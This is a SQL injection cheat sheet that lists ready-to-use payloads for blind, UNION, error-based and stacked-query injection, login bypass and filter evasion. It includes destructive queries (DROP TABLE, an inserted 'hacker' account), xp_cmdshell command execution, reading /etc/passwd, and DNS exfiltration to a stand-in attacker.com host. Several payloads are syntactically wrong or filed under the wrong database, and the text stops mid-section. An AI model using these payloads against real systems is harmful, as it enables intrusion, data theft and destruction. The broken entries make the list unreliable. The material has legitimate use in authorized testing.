# SQL Injection Quick Reference
Curated SQL injection payloads for authorized security testing.

## Boolean-Based Blind SQLi
```
' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin'--
' OR 1=1#
' OR 'x'='x
' OR 1=1--
```

## Time-Based Blind SQLi
**MySQL:**
```
' AND SLEEP(5--
' AND BENCHMARK(5000000,SHA1('test'))--
' WAITFOR DELAY '00:00:05'--
```

**PostgreSQL:**
```
' AND 1=1 WAITFOR DELAY '00:00:05'--
'; SELECT pg_sleep(5)--
```

**MSSQL:**
```
'; WAITFOR DELAY '00:00:05'--
'; IF(1=1) WAITFOR DELAY '00:00:05'--
```

## UNION-Based SQLi
**MySQL:**
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1--
' UNION SELECT 1,2,3--
' UNION ALL SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
```

**Oracle:**
```
' UNION SELECT NULL FROM DUAL--
' UNION SELECT banner,NULL FROM v$version--
```

## Error-Based SQLi
**MySQL:**
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
```

**MSSQL:**
```
' AND 1/0--
```

## Stacked Queries
**MySQL:**
```
'; SELECT * FROM users;--
'; INSERT INTO users VALUES('hacker','pass');--
'; DROP TABLE users;--
```

**MSSQL:**
```
'; EXEC xp_cmdshell 'dir';--
'; EXEC sp_executesql @SQL;--
```

## Authentication Bypass
```
admin'--
admin' #
admin'/*
' OR '1'='1
' OR 1=1--
' OR 'a'='a
' OR 1=1#
' OR 'x'='x
' or ''='
' or 1=1 --
" or ""="
' or 'a'='a
```

## Data Exfiltration (Out-of-Band)
**MySQL:**
```
' UNION SELECT LOAD_FILE('/etc/passwd')--
' INTO OUTFILE '/tmp/out.txt'--
```

**DNS exfiltration:**
```
' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\')))--
```

## Filter Bypass Techniques
**Spaces bypass:**
```
/**/UNION/**/SELECT/**/
/*!UNION*/SELECT
%09%0a%0d%20
```

**Quotes bypass:**
```
CHAR(39)
0x2731
```

**NULL byte:**
```
%00' OR 1=1--
```

**Case manipulation:**
```
UniOn SeLeCt